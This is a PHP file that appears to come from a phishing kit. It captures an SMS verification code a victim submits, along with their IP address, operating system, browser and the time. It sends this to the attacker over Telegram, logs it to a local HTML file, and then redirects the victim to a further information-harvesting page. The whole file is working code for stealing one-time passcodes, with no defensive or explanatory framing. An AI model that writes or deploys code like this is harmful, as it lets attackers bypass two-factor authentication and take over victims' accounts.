<?php
require_once("config.php");
$message = '/-- SMS --/' . getIPAddress() . "\r\n";
$message .= '[SMS] = ' . $_POST["verifier"] . "\r\n";
$message .= '[TIME/DATE] = ' . $date . "\r\n";
$message .= '[IP address] = ' . getIPAddress() . "\r\n";
$message .= '[OS] = ' . $user_os . "\r\n";
$message .= '[BROWSER] = ' . $user_browser . "\r\n";
telegram_send(urlencode($message));
$house = fopen('fucked/SMS.html', 'a');
fwrite($house, $message);
fclose($house);
header("Location: clients/informations.php");
?>